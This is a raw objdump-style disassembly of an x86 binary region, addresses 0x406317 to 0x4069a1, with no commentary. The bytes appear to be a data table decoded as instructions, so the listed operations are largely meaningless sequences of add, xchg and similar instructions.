  406317:	00 00                	add    %al,(%eax)
  406319:	00 96 08 4d 17 7f    	add    %dl,0x7f174d08(%esi)
  40631f:	00 09                	add    %cl,(%ecx)
  406321:	00 0e                	add    %cl,(%esi)
  406323:	21 00                	and    %eax,(%eax)
  406325:	00 00                	add    %al,(%eax)
  406327:	00 96 08 5c 14 1d    	add    %dl,0x1d145c08(%esi)
  40632d:	00 0a                	add    %cl,(%edx)
  40632f:	00 15 21 00 00 00    	add    %dl,0x21
  406335:	00 96 08 6d 14 72    	add    %dl,0x72146d08(%esi)
  40633b:	00 0a                	add    %cl,(%edx)
  40633d:	00 6c 29 00          	add    %ch,0x0(%ecx,%ebp,1)
  406341:	00 00                	add    %al,(%eax)
  406343:	00 96 00 d9 09 0a    	add    %dl,0xa09d900(%esi)
  406349:	00 0b                	add    %cl,(%ebx)
  40634b:	00 1d 21 00 00 00    	add    %bl,0x21
  406351:	00 91 00 cf 01 84    	add    %dl,-0x7bfe3100(%ecx)
  406357:	00 0b                	add    %cl,(%ebx)
  406359:	00 28                	add    %ch,(%eax)
  40635b:	21 00                	and    %eax,(%eax)
  40635d:	00 00                	add    %al,(%eax)
  40635f:	00 91 00 24 02 89    	add    %dl,-0x76fddc00(%ecx)
  406365:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406368:	b8 2c 00 00 00       	mov    $0x2c,%eax
  40636d:	00 96 00 da 20 0a    	add    %dl,0xa20da00(%esi)
  406373:	00 10                	add    %dl,(%eax)
  406375:	00 40 2d             	add    %al,0x2d(%eax)
  406378:	00 00                	add    %al,(%eax)
  40637a:	00 00                	add    %al,(%eax)
  40637c:	96                   	xchg   %eax,%esi
  40637d:	00 2d 05 94 00 10    	add    %ch,0x10009405
  406383:	00 24 2f             	add    %ah,(%edi,%ebp,1)
  406386:	00 00                	add    %al,(%eax)
  406388:	00 00                	add    %al,(%eax)
  40638a:	96                   	xchg   %eax,%esi
  40638b:	00 11                	add    %dl,(%ecx)
  40638d:	0a 58 00             	or     0x0(%eax),%bl
  406390:	11 00                	adc    %eax,(%eax)
  406392:	5c                   	pop    %esp
  406393:	30 00                	xor    %al,(%eax)
  406395:	00 00                	add    %al,(%eax)
  406397:	00 96 00 32 01 9a    	add    %dl,-0x65fece00(%esi)
  40639d:	00 12                	add    %dl,(%edx)
  40639f:	00 c8                	add    %cl,%al
  4063a1:	30 00                	xor    %al,(%eax)
  4063a3:	00 00                	add    %al,(%eax)
  4063a5:	00 91 00 cd 12 9a    	add    %dl,-0x65ed3300(%ecx)
  4063ab:	00 13                	add    %dl,(%ebx)
  4063ad:	00 35 21 00 00 00    	add    %dh,0x21
  4063b3:	00 91 18 fa 1d 0a    	add    %dl,0xa1dfa18(%ecx)
  4063b9:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063bc:	10 31                	adc    %dh,(%ecx)
  4063be:	00 00                	add    %al,(%eax)
  4063c0:	00 00                	add    %al,(%eax)
  4063c2:	96                   	xchg   %eax,%esi
  4063c3:	00 02                	add    %al,(%edx)
  4063c5:	05 0a 00 14 00       	add    $0x14000a,%eax
  4063ca:	78 20                	js     0x4063ec
  4063cc:	00 00                	add    %al,(%eax)
  4063ce:	00 00                	add    %al,(%eax)
  4063d0:	86 18                	xchg   %bl,(%eax)
  4063d2:	f4                   	hlt
  4063d3:	1d 0e 00 14 00       	sbb    $0x14000e,%eax
  4063d8:	41                   	inc    %ecx
  4063d9:	21 00                	and    %eax,(%eax)
  4063db:	00 00                	add    %al,(%eax)
  4063dd:	00 96 00 86 02 0a    	add    %dl,0xa028600(%esi)
  4063e3:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063e6:	f8                   	clc
  4063e7:	33 00                	xor    (%eax),%eax
  4063e9:	00 00                	add    %al,(%eax)
  4063eb:	00 91 00 f9 07 1d    	add    %dl,0x1d07f900(%ecx)
  4063f1:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063f4:	50                   	push   %eax
  4063f5:	34 00                	xor    $0x0,%al
  4063f7:	00 00                	add    %al,(%eax)
  4063f9:	00 91 00 84 24 1d    	add    %dl,0x1d248400(%ecx)
  4063ff:	00 14 00             	add    %dl,(%eax,%eax,1)
  406402:	a0 34 00 00 00       	mov    0x34,%al
  406407:	00 91 00 cc 09 1d    	add    %dl,0x1d09cc00(%ecx)
  40640d:	00 14 00             	add    %dl,(%eax,%eax,1)
  406410:	dc 35 00 00 00 00    	fdivl  0x0
  406416:	91                   	xchg   %eax,%ecx
  406417:	00 02                	add    %al,(%edx)
  406419:	21 1d 00 14 00 20    	and    %ebx,0x20001400
  40641f:	36 00 00             	add    %al,%ss:(%eax)
  406422:	00 00                	add    %al,(%eax)
  406424:	91                   	xchg   %eax,%ecx
  406425:	00 1f                	add    %bl,(%edi)
  406427:	06                   	push   %es
  406428:	1d 00 14 00 78       	sbb    $0x78001400,%eax
  40642d:	20 00                	and    %al,(%eax)
  40642f:	00 00                	add    %al,(%eax)
  406431:	00 86 18 f4 1d 0e    	add    %al,0xe1df418(%esi)
  406437:	00 14 00             	add    %dl,(%eax,%eax,1)
  40643a:	6c                   	insb   (%dx),%es:(%edi)
  40643b:	36 00 00             	add    %al,%ss:(%eax)
  40643e:	00 00                	add    %al,(%eax)
  406440:	96                   	xchg   %eax,%esi
  406441:	00 a1 06 c3 00 14    	add    %ah,0x1400c306(%ecx)
  406447:	00 f0                	add    %dh,%al
  406449:	36 00 00             	add    %al,%ss:(%eax)
  40644c:	00 00                	add    %al,(%eax)
  40644e:	96                   	xchg   %eax,%esi
  40644f:	00 eb                	add    %ch,%bl
  406451:	1b c7                	sbb    %edi,%eax
  406453:	00 14 00             	add    %dl,(%eax,%eax,1)
  406456:	5c                   	pop    %esp
  406457:	37                   	aaa
  406458:	00 00                	add    %al,(%eax)
  40645a:	00 00                	add    %al,(%eax)
  40645c:	96                   	xchg   %eax,%esi
  40645d:	00 a0 23 53 00 15    	add    %ah,0x15005323(%eax)
  406463:	00 7b 21             	add    %bh,0x21(%ebx)
  406466:	00 00                	add    %al,(%eax)
  406468:	00 00                	add    %al,(%eax)
  40646a:	96                   	xchg   %eax,%esi
  40646b:	00 54 1a 1d          	add    %dl,0x1d(%edx,%ebx,1)
  40646f:	00 15 00 18 39 00    	add    %dl,0x391800
  406475:	00 00                	add    %al,(%eax)
  406477:	00 96 00 51 02 0a    	add    %dl,0xa025100(%esi)
  40647d:	00 15 00 90 39 00    	add    %dl,0x399000
  406483:	00 00                	add    %al,(%eax)
  406485:	00 96 00 41 04 c3    	add    %dl,-0x3cfbbf00(%esi)
  40648b:	00 15 00 7c 3a 00    	add    %dl,0x3a7c00
  406491:	00 00                	add    %al,(%eax)
  406493:	00 96 00 cb 23 d5    	add    %dl,-0x2adc3500(%esi)
  406499:	00 15 00 c4 3a 00    	add    %dl,0x3ac400
  40649f:	00 00                	add    %al,(%eax)
  4064a1:	00 96 00 d1 14 0a    	add    %dl,0xa14d100(%esi)
  4064a7:	00 16                	add    %dl,(%esi)
  4064a9:	00 f8                	add    %bh,%al
  4064ab:	3a 00                	cmp    (%eax),%al
  4064ad:	00 00                	add    %al,(%eax)
  4064af:	00 96 00 af 06 c3    	add    %dl,-0x3cf95100(%esi)
  4064b5:	00 16                	add    %dl,(%esi)
  4064b7:	00 54 3b 00          	add    %dl,0x0(%ebx,%edi,1)
  4064bb:	00 00                	add    %al,(%eax)
  4064bd:	00 96 00 d3 16 1d    	add    %dl,0x1d16d300(%esi)
  4064c3:	00 16                	add    %dl,(%esi)
  4064c5:	00 91 21 00 00 00    	add    %dl,0x21(%ecx)
  4064cb:	00 96 00 0a 0d 0a    	add    %dl,0xa0d0a00(%esi)
  4064d1:	00 16                	add    %dl,(%esi)
  4064d3:	00 00                	add    %al,(%eax)
  4064d5:	00 00                	add    %al,(%eax)
  4064d7:	00 80 00 96 20 b5    	add    %al,-0x4adf6a00(%eax)
  4064dd:	1b e0                	sbb    %eax,%esp
  4064df:	00 16                	add    %dl,(%esi)
  4064e1:	00 00                	add    %al,(%eax)
  4064e3:	00 00                	add    %al,(%eax)
  4064e5:	00 80 00 96 20 38    	add    %al,0x38209600(%eax)
  4064eb:	03 e4                	add    %esp,%esp
  4064ed:	00 16                	add    %dl,(%esi)
  4064ef:	00 00                	add    %al,(%eax)
  4064f1:	00 00                	add    %al,(%eax)
  4064f3:	00 80 00 96 20 8f    	add    %al,-0x70df6a00(%eax)
  4064f9:	1b ec                	sbb    %esp,%ebp
  4064fb:	00 19                	add    %bl,(%ecx)
  4064fd:	00 00                	add    %al,(%eax)
  4064ff:	00 00                	add    %al,(%eax)
  406501:	00 80 00 96 20 f0    	add    %al,-0xfdf6a00(%eax)
  406507:	03 f1                	add    %ecx,%esi
  406509:	00 1a                	add    %bl,(%edx)
  40650b:	00 00                	add    %al,(%eax)
  40650d:	00 00                	add    %al,(%eax)
  40650f:	00 80 00 96 20 ab    	add    %al,-0x54df6a00(%eax)
  406515:	07                   	pop    %es
  406516:	f8                   	clc
  406517:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40651a:	00 00                	add    %al,(%eax)
  40651c:	00 00                	add    %al,(%eax)
  40651e:	80 00 96             	addb   $0x96,(%eax)
  406521:	20 88 25 ff 00 1d    	and    %cl,0x1d00ff25(%eax)
  406527:	00 ad 21 00 00 00    	add    %ch,0x21(%ebp)
  40652d:	00 96 00 d5 04 1c    	add    %dl,0x1c04d500(%esi)
  406533:	01 20                	add    %esp,(%eax)
  406535:	00 74 3b 00          	add    %dh,0x0(%ebx,%edi,1)
  406539:	00 00                	add    %al,(%eax)
  40653b:	00 96 00 79 15 0a    	add    %dl,0xa157900(%esi)
  406541:	00 22                	add    %ah,(%edx)
  406543:	00 bc 3b 00 00 00 00 	add    %bh,0x0(%ebx,%edi,1)
  40654a:	96                   	xchg   %eax,%esi
  40654b:	00 9c 00 0a 00 22 00 	add    %bl,0x22000a(%eax,%eax,1)
  406552:	f4                   	hlt
  406553:	3b 00                	cmp    (%eax),%eax
  406555:	00 00                	add    %al,(%eax)
  406557:	00 96 00 c8 03 23    	add    %dl,0x2303c800(%esi)
  40655d:	01 22                	add    %esp,(%edx)
  40655f:	00 60 3c             	add    %ah,0x3c(%eax)
  406562:	00 00                	add    %al,(%eax)
  406564:	00 00                	add    %al,(%eax)
  406566:	96                   	xchg   %eax,%esi
  406567:	00 3b                	add    %bh,(%ebx)
  406569:	0b 2a                	or     (%edx),%ebp
  40656b:	01 24 00             	add    %esp,(%eax,%eax,1)
  40656e:	cc                   	int3
  40656f:	3c 00                	cmp    $0x0,%al
  406571:	00 00                	add    %al,(%eax)
  406573:	00 96 00 0f 21 84    	add    %dl,-0x7bdef100(%esi)
  406579:	00 25 00 34 3d 00    	add    %ah,0x3d3400
  40657f:	00 00                	add    %al,(%eax)
  406581:	00 96 00 93 09 1d    	add    %dl,0x1d099300(%esi)
  406587:	00 26                	add    %ah,(%esi)
  406589:	00 cd                	add    %cl,%ch
  40658b:	21 00                	and    %eax,(%eax)
  40658d:	00 00                	add    %al,(%eax)
  40658f:	00 91 18 fa 1d 0a    	add    %dl,0xa1dfa18(%ecx)
  406595:	00 26                	add    %ah,(%esi)
  406597:	00 a0 3d 00 00 00    	add    %ah,0x3d(%eax)
  40659d:	00 96 00 df 14 9a    	add    %dl,-0x65eb2100(%esi)
  4065a3:	00 26                	add    %ah,(%esi)
  4065a5:	00 d4                	add    %dl,%ah
  4065a7:	3f                   	aas
  4065a8:	00 00                	add    %al,(%eax)
  4065aa:	00 00                	add    %al,(%eax)
  4065ac:	91                   	xchg   %eax,%ecx
  4065ad:	00 25 25 38 01 27    	add    %ah,0x27013825
  4065b3:	00 e3                	add    %ah,%bl
  4065b5:	21 00                	and    %eax,(%eax)
  4065b7:	00 00                	add    %al,(%eax)
  4065b9:	00 91 00 23 08 0a    	add    %dl,0xa082300(%ecx)
  4065bf:	00 28                	add    %ch,(%eax)
  4065c1:	00 13                	add    %dl,(%ebx)
  4065c3:	22 00                	and    (%eax),%al
  4065c5:	00 00                	add    %al,(%eax)
  4065c7:	00 96 00 12 08 3e    	add    %dl,0x3e081200(%esi)
  4065cd:	01 28                	add    %ebp,(%eax)
  4065cf:	00 4a 22             	add    %cl,0x22(%edx)
  4065d2:	00 00                	add    %al,(%eax)
  4065d4:	00 00                	add    %al,(%eax)
  4065d6:	91                   	xchg   %eax,%ecx
  4065d7:	18 fa                	sbb    %bh,%dl
  4065d9:	1d 0a 00 29 00       	sbb    $0x29000a,%eax
  4065de:	f4                   	hlt
  4065df:	40                   	inc    %eax
  4065e0:	00 00                	add    %al,(%eax)
  4065e2:	00 00                	add    %al,(%eax)
  4065e4:	86 18                	xchg   %bl,(%eax)
  4065e6:	f4                   	hlt
  4065e7:	1d 6b 01 29 00       	sbb    $0x29016b,%eax
  4065ec:	56                   	push   %esi
  4065ed:	22 00                	and    (%eax),%al
  4065ef:	00 00                	add    %al,(%eax)
  4065f1:	00 86 00 0e 16 70    	add    %al,0x70160e00(%esi)
  4065f7:	01 2a                	add    %ebp,(%edx)
  4065f9:	00 6c 41 00          	add    %ch,0x0(%ecx,%eax,2)
  4065fd:	00 00                	add    %al,(%eax)
  4065ff:	00 86 00 e0 05 75    	add    %al,0x7505e000(%esi)
  406605:	01 2b                	add    %ebp,(%ebx)
  406607:	00 6e 22             	add    %ch,0x22(%esi)
  40660a:	00 00                	add    %al,(%eax)
  40660c:	00 00                	add    %al,(%eax)
  40660e:	86 00                	xchg   %al,(%eax)
  406610:	17                   	pop    %ss
  406611:	13 70 01             	adc    0x1(%eax),%esi
  406614:	2c 00                	sub    $0x0,%al
  406616:	c4 42 00             	les    0x0(%edx),%eax
  406619:	00 00                	add    %al,(%eax)
  40661b:	00 86 00 12 0b 75    	add    %al,0x750b1200(%esi)
  406621:	01 2d 00 84 44 00    	add    %ebp,0x448400
  406627:	00 48 00             	add    %cl,0x0(%eax)
  40662a:	81 00 fd 1a 7c 01    	addl   $0x17c1afd,(%eax)
  406630:	2e 00 86 22 00 00 00 	add    %al,%cs:0x22(%esi)
  406637:	00 91 18 fa 1d 0a    	add    %dl,0xa1dfa18(%ecx)
  40663d:	00 30                	add    %dh,(%eax)
  40663f:	00 b4 44 00 00 00 00 	add    %dh,0x0(%esp,%eax,2)
  406646:	96                   	xchg   %eax,%esi
  406647:	00 15 03 c7 00 30    	add    %dl,0x3000c703
  40664d:	00 40 45             	add    %al,0x45(%eax)
  406650:	00 00                	add    %al,(%eax)
  406652:	00 00                	add    %al,(%eax)
  406654:	96                   	xchg   %eax,%esi
  406655:	00 f8                	add    %bh,%al
  406657:	14 84                	adc    $0x84,%al
  406659:	01 31                	add    %esi,(%ecx)
  40665b:	00 9f 22 00 00 00    	add    %bl,0x22(%edi)
  406661:	00 96 00 f6 0a 2a    	add    %dl,0x2a0af600(%esi)
  406667:	01 32                	add    %esi,(%edx)
  406669:	00 ac 22 00 00 00 00 	add    %ch,0x0(%edx,%eiz,1)
  406670:	96                   	xchg   %eax,%esi
  406671:	00 3a                	add    %bh,(%edx)
  406673:	02 93 01 33 00 80    	add    -0x7fffccff(%ebx),%dl
  406679:	45                   	inc    %ebp
  40667a:	00 00                	add    %al,(%eax)
  40667c:	00 00                	add    %al,(%eax)
  40667e:	96                   	xchg   %eax,%esi
  40667f:	00 d5                	add    %dl,%ch
  406681:	00 93 01 34 00 c8    	add    %dl,-0x37ffcbff(%ebx)
  406687:	45                   	inc    %ebp
  406688:	00 00                	add    %al,(%eax)
  40668a:	00 00                	add    %al,(%eax)
  40668c:	96                   	xchg   %eax,%esi
  40668d:	00 b5 01 93 01 35    	add    %dh,0x35019301(%ebp)
  406693:	00 10                	add    %dl,(%eax)
  406695:	46                   	inc    %esi
  406696:	00 00                	add    %al,(%eax)
  406698:	00 00                	add    %al,(%eax)
  40669a:	96                   	xchg   %eax,%esi
  40669b:	00 87 08 84 01 36    	add    %al,0x36018408(%edi)
  4066a1:	00 b9 22 00 00 00    	add    %bh,0x22(%ecx)
  4066a7:	00 96 00 2f 02 99    	add    %dl,-0x66fdd100(%esi)
  4066ad:	01 37                	add    %esi,(%edi)
  4066af:	00 c6                	add    %al,%dh
  4066b1:	22 00                	and    (%eax),%al
  4066b3:	00 00                	add    %al,(%eax)
  4066b5:	00 96 00 59 08 9f    	add    %dl,-0x60f7a700(%esi)
  4066bb:	01 38                	add    %edi,(%eax)
  4066bd:	00 ea                	add    %ch,%dl
  4066bf:	22 00                	and    (%eax),%al
  4066c1:	00 00                	add    %al,(%eax)
  4066c3:	00 96 00 c7 1f a5    	add    %dl,-0x5ae03900(%esi)
  4066c9:	01 39                	add    %edi,(%ecx)
  4066cb:	00 fe                	add    %bh,%dh
  4066cd:	22 00                	and    (%eax),%al
  4066cf:	00 00                	add    %al,(%eax)
  4066d1:	00 96 00 9b 1b ab    	add    %dl,-0x54e46500(%esi)
  4066d7:	01 3a                	add    %edi,(%edx)
  4066d9:	00 78 20             	add    %bh,0x20(%eax)
  4066dc:	00 00                	add    %al,(%eax)
  4066de:	00 00                	add    %al,(%eax)
  4066e0:	86 18                	xchg   %bl,(%eax)
  4066e2:	f4                   	hlt
  4066e3:	1d 0e 00 3b 00       	sbb    $0x3b000e,%eax
  4066e8:	0b 23                	or     (%ebx),%esp
  4066ea:	00 00                	add    %al,(%eax)
  4066ec:	00 00                	add    %al,(%eax)
  4066ee:	91                   	xchg   %eax,%ecx
  4066ef:	18 fa                	sbb    %bh,%dl
  4066f1:	1d 0a 00 3b 00       	sbb    $0x3b000a,%eax
  4066f6:	17                   	pop    %ss
  4066f7:	23 00                	and    (%eax),%eax
  4066f9:	00 00                	add    %al,(%eax)
  4066fb:	00 86 18 f4 1d b1    	add    %al,-0x4ee20be8(%esi)
  406701:	01 3b                	add    %edi,(%ebx)
  406703:	00 2d 23 00 00 00    	add    %ch,0x23
  406709:	00 e1                	add    %ah,%cl
  40670b:	09 63 22             	or     %esp,0x22(%ebx)
  40670e:	bb 01 3c 00 40       	mov    $0x40003c01,%ebx
  406713:	23 00                	and    (%eax),%eax
  406715:	00 00                	add    %al,(%eax)
  406717:	00 e1                	add    %ah,%cl
  406719:	01 34 23             	add    %esi,(%ebx,%eiz,1)
  40671c:	bf 01 3c 00 63       	mov    $0x63003c01,%edi
  406721:	23 00                	and    (%eax),%eax
  406723:	00 00                	add    %al,(%eax)
  406725:	00 e1                	add    %ah,%cl
  406727:	01 8a 21 0e 00 3c    	add    %ecx,0x3c000e21(%edx)
  40672d:	00 6c 23 00          	add    %ch,0x0(%ebx,%eiz,1)
  406731:	00 00                	add    %al,(%eax)
  406733:	00 86 18 f4 1d cb    	add    %al,-0x34e20be8(%esi)
  406739:	01 3c 00             	add    %edi,(%eax,%eax,1)
  40673c:	82 23 00             	andb   $0x0,(%ebx)
  40673f:	00 00                	add    %al,(%eax)
  406741:	00 86 00 d4 18 d7    	add    %al,-0x28e72c00(%esi)
  406747:	01 3e                	add    %edi,(%esi)
  406749:	00 8f 23 00 00 00    	add    %cl,0x23(%edi)
  40674f:	00 86 00 40 01 dc    	add    %al,-0x23fec000(%esi)
  406755:	01 3e                	add    %edi,(%esi)
  406757:	00 a3 23 00 00 00    	add    %ah,0x23(%ebx)
  40675d:	00 86 00 24 13 e2    	add    %al,-0x1decdc00(%esi)
  406763:	01 3f                	add    %edi,(%edi)
  406765:	00 b7 23 00 00 00    	add    %dh,0x23(%edi)
  40676b:	00 86 00 50 04 e8    	add    %al,-0x17fbb000(%esi)
  406771:	01 40 00             	add    %eax,0x0(%eax)
  406774:	cb                   	lret
  406775:	23 00                	and    (%eax),%eax
  406777:	00 00                	add    %al,(%eax)
  406779:	00 86 08 24 18 ee    	add    %al,-0x11e7dbf8(%esi)
  40677f:	01 41 00             	add    %eax,0x0(%ecx)
  406782:	d9 23                	fldenv (%ebx)
  406784:	00 00                	add    %al,(%eax)
  406786:	00 00                	add    %al,(%eax)
  406788:	86 08                	xchg   %cl,(%eax)
  40678a:	5f                   	pop    %edi
  40678b:	15 f4 01 42 00       	adc    $0x4201f4,%eax
  406790:	e6 23                	out    %al,$0x23
  406792:	00 00                	add    %al,(%eax)
  406794:	00 00                	add    %al,(%eax)
  406796:	81 00 87 15 6b 01    	addl   $0x16b1587,(%eax)
  40679c:	42                   	inc    %edx
  40679d:	00 48 46             	add    %cl,0x46(%eax)
  4067a0:	00 00                	add    %al,(%eax)
  4067a2:	00 00                	add    %al,(%eax)
  4067a4:	81 00 75 09 0e 00    	addl   $0xe0975,(%eax)
  4067aa:	43                   	inc    %ebx
  4067ab:	00 8c 46 00 00 00 00 	add    %cl,0x0(%esi,%eax,2)
  4067b2:	81 00 f6 12 d7 01    	addl   $0x1d712f6,(%eax)
  4067b8:	43                   	inc    %ebx
  4067b9:	00 b4 46 00 00 00 00 	add    %dh,0x0(%esi,%eax,2)
  4067c0:	81 00 4b 07 0a 02    	addl   $0x20a074b,(%eax)
  4067c6:	43                   	inc    %ebx
  4067c7:	00 30                	add    %dh,(%eax)
  4067c9:	47                   	inc    %edi
  4067ca:	00 00                	add    %al,(%eax)
  4067cc:	00 00                	add    %al,(%eax)
  4067ce:	86 00                	xchg   %al,(%eax)
  4067d0:	fc                   	cld
  4067d1:	03 dc                	add    %esp,%ebx
  4067d3:	01 44 00 00          	add    %eax,0x0(%eax,%eax,1)
  4067d7:	24 00                	and    $0x0,%al
  4067d9:	00 00                	add    %al,(%eax)
  4067db:	00 81 00 c9 06 d7    	add    %al,-0x28f93700(%ecx)
  4067e1:	01 45 00             	add    %eax,0x0(%ebp)
  4067e4:	21 24 00             	and    %esp,(%eax,%eax,1)
  4067e7:	00 00                	add    %al,(%eax)
  4067e9:	00 81 00 e2 18 d7    	add    %al,-0x28e71e00(%ecx)
  4067ef:	01 45 00             	add    %eax,0x0(%ebp)
  4067f2:	42                   	inc    %edx
  4067f3:	24 00                	and    $0x0,%al
  4067f5:	00 00                	add    %al,(%eax)
  4067f7:	00 86 00 91 04 d7    	add    %al,-0x28fb6f00(%esi)
  4067fd:	01 45 00             	add    %eax,0x0(%ebp)
  406800:	5c                   	pop    %esp
  406801:	47                   	inc    %edi
  406802:	00 00                	add    %al,(%eax)
  406804:	00 00                	add    %al,(%eax)
  406806:	81 00 57 09 0f 02    	addl   $0x20f0957,(%eax)
  40680c:	45                   	inc    %ebp
  40680d:	00 24 48             	add    %ah,(%eax,%ecx,2)
  406810:	00 00                	add    %al,(%eax)
  406812:	00 00                	add    %al,(%eax)
  406814:	81 00 ad 02 0f 02    	addl   $0x20f02ad,(%eax)
  40681a:	46                   	inc    %esi
  40681b:	00 4a 24             	add    %cl,0x24(%edx)
  40681e:	00 00                	add    %al,(%eax)
  406820:	00 00                	add    %al,(%eax)
  406822:	86 00                	xchg   %al,(%eax)
  406824:	0f 07                	sysret
  406826:	15 02 47 00 5f       	adc    $0x5f004702,%eax
  40682b:	24 00                	and    $0x0,%al
  40682d:	00 00                	add    %al,(%eax)
  40682f:	00 86 00 37 1b 1a    	add    %al,0x1a1b3700(%esi)
  406835:	02 48 00             	add    0x0(%eax),%cl
  406838:	d8 48 00             	fmuls  0x0(%eax)
  40683b:	00 00                	add    %al,(%eax)
  40683d:	00 86 00 a5 01 1f    	add    %al,0x1f01a500(%esi)
  406843:	02 49 00             	add    0x0(%ecx),%cl
  406846:	80 49 00 00          	orb    $0x0,0x0(%ecx)
  40684a:	00 00                	add    %al,(%eax)
  40684c:	86 00                	xchg   %al,(%eax)
  40684e:	b1 08                	mov    $0x8,%cl
  406850:	23 02                	and    (%edx),%eax
  406852:	49                   	dec    %ecx
  406853:	00 28                	add    %ch,(%eax)
  406855:	4a                   	dec    %edx
  406856:	00 00                	add    %al,(%eax)
  406858:	00 00                	add    %al,(%eax)
  40685a:	86 00                	xchg   %al,(%eax)
  40685c:	e0 07                	loopne 0x406865
  40685e:	27                   	daa
  40685f:	02 49 00             	add    0x0(%ecx),%cl
  406862:	74 24                	je     0x406888
  406864:	00 00                	add    %al,(%eax)
  406866:	00 00                	add    %al,(%eax)
  406868:	86 00                	xchg   %al,(%eax)
  40686a:	f4                   	hlt
  40686b:	09 2b                	or     %ebp,(%ebx)
  40686d:	02 49 00             	add    0x0(%ecx),%cl
  406870:	bc 4a 00 00 00       	mov    $0x4a,%esp
  406875:	00 86 00 3c 0d 31    	add    %al,0x310d3c00(%esi)
  40687b:	02 4a 00             	add    0x0(%edx),%cl
  40687e:	85 24 00             	test   %esp,(%eax,%eax,1)
  406881:	00 00                	add    %al,(%eax)
  406883:	00 86 00 2c 0a 36    	add    %al,0x360a2c00(%esi)
  406889:	02 4a 00             	add    0x0(%edx),%cl
  40688c:	9a 24 00 00 00 00 86 	lcall  $0x8600,$0x24
  406893:	00 04 02             	add    %al,(%edx,%eax,1)
  406896:	3c 02                	cmp    $0x2,%al
  406898:	4c                   	dec    %esp
  406899:	00 6c 4b 00          	add    %ch,0x0(%ebx,%ecx,2)
  40689d:	00 00                	add    %al,(%eax)
  40689f:	00 86 00 59 24 42    	add    %al,0x42245900(%esi)
  4068a5:	02 4e 00             	add    0x0(%esi),%cl
  4068a8:	c4 4b 00             	les    0x0(%ebx),%ecx
  4068ab:	00 00                	add    %al,(%eax)
  4068ad:	00 86 00 08 04 42    	add    %al,0x42040800(%esi)
  4068b3:	02 4f 00             	add    0x0(%edi),%cl
  4068b6:	10 4c 00 00          	adc    %cl,0x0(%eax,%eax,1)
  4068ba:	00 00                	add    %al,(%eax)
  4068bc:	86 00                	xchg   %al,(%eax)
  4068be:	ba 18 dc 01 50       	mov    $0x5001dc18,%edx
  4068c3:	00 b0 24 00 00 00    	add    %dh,0x24(%eax)
  4068c9:	00 86 00 83 1b 0e    	add    %al,0xe1b8300(%esi)
  4068cf:	00 51 00             	add    %dl,0x0(%ecx)
  4068d2:	c6                   	(bad)
  4068d3:	24 00                	and    $0x0,%al
  4068d5:	00 00                	add    %al,(%eax)
  4068d7:	00 86 00 5f 04 6b    	add    %al,0x6b045f00(%esi)
  4068dd:	01 51 00             	add    %edx,0x0(%ecx)
  4068e0:	d6                   	salc
  4068e1:	24 00                	and    $0x0,%al
  4068e3:	00 00                	add    %al,(%eax)
  4068e5:	00 86 00 f8 02 47    	add    %al,0x4702f800(%esi)
  4068eb:	02 52 00             	add    0x0(%edx),%dl
  4068ee:	f4                   	hlt
  4068ef:	24 00                	and    $0x0,%al
  4068f1:	00 00                	add    %al,(%eax)
  4068f3:	00 86 00 6a 15 4b    	add    %al,0x4b156a00(%esi)
  4068f9:	02 52 00             	add    0x0(%edx),%dl
  4068fc:	09 25 00 00 00 00    	or     %esp,0x0
  406902:	86 00                	xchg   %al,(%eax)
  406904:	83 23 50             	andl   $0x50,(%ebx)
  406907:	02 53 00             	add    0x0(%ebx),%dl
  40690a:	1f                   	pop    %ds
  40690b:	25 00 00 00 00       	and    $0x0,%eax
  406910:	86 00                	xchg   %al,(%eax)
  406912:	91                   	xchg   %eax,%ecx
  406913:	0a 55 02             	or     0x2(%ebp),%dl
  406916:	54                   	push   %esp
  406917:	00 cc                	add    %cl,%ah
  406919:	4c                   	dec    %esp
  40691a:	00 00                	add    %al,(%eax)
  40691c:	00 00                	add    %al,(%eax)
  40691e:	86 00                	xchg   %al,(%eax)
  406920:	a1 08 2b 02 55       	mov    0x55022b08,%eax
  406925:	00 24 4d 00 00 00 00 	add    %ah,0x0(,%ecx,2)
  40692c:	86 00                	xchg   %al,(%eax)
  40692e:	a3 25 6b 01 56       	mov    %eax,0x56016b25
  406933:	00 48 4d             	add    %cl,0x4d(%eax)
  406936:	00 00                	add    %al,(%eax)
  406938:	00 00                	add    %al,(%eax)
  40693a:	86 00                	xchg   %al,(%eax)
  40693c:	c1 01 0f             	roll   $0xf,(%ecx)
  40693f:	02 57 00             	add    0x0(%edi),%dl
  406942:	5c                   	pop    %esp
  406943:	53                   	push   %ebx
  406944:	00 00                	add    %al,(%eax)
  406946:	00 00                	add    %al,(%eax)
  406948:	86 00                	xchg   %al,(%eax)
  40694a:	93                   	xchg   %eax,%ebx
  40694b:	02 31                	add    (%ecx),%dh
  40694d:	02 58 00             	add    0x0(%eax),%bl
  406950:	c8 53 00 00          	enter  $0x53,$0x0
  406954:	00 00                	add    %al,(%eax)
  406956:	86 00                	xchg   %al,(%eax)
  406958:	e4 06                	in     $0x6,%al
  40695a:	0f 02 58 00          	lar    0x0(%eax),%ebx
  40695e:	34 25                	xor    $0x25,%al
  406960:	00 00                	add    %al,(%eax)
  406962:	00 00                	add    %al,(%eax)
  406964:	86 08                	xchg   %cl,(%eax)
  406966:	1f                   	pop    %ds
  406967:	14 47                	adc    $0x47,%al
  406969:	02 59 00             	add    0x0(%ecx),%bl
  40696c:	3c 25                	cmp    $0x25,%al
  40696e:	00 00                	add    %al,(%eax)
  406970:	00 00                	add    %al,(%eax)
  406972:	86 08                	xchg   %cl,(%eax)
  406974:	2c 14                	sub    $0x14,%al
  406976:	6b 01 59             	imul   $0x59,(%ecx),%eax
  406979:	00 45 25             	add    %al,0x25(%ebp)
  40697c:	00 00                	add    %al,(%eax)
  40697e:	00 00                	add    %al,(%eax)
  406980:	86 08                	xchg   %cl,(%eax)
  406982:	dc 1c 23             	fcompl (%ebx,%eiz,1)
  406985:	02 5a 00             	add    0x0(%edx),%bl
  406988:	4d                   	dec    %ebp
  406989:	25 00 00 00 00       	and    $0x0,%eax
  40698e:	86 08                	xchg   %cl,(%eax)
  406990:	ea 1c 15 02 5a 00 56 	ljmp   $0x5600,$0x5a02151c
  406997:	25 00 00 00 00       	and    $0x0,%eax
  40699c:	86 08                	xchg   %cl,(%eax)
  40699e:	30 21                	xor    %ah,(%ecx)
  4069a0:	27                   	daa
  4069a1:	02 5b 00             	add    0x0(%ebx),%bl
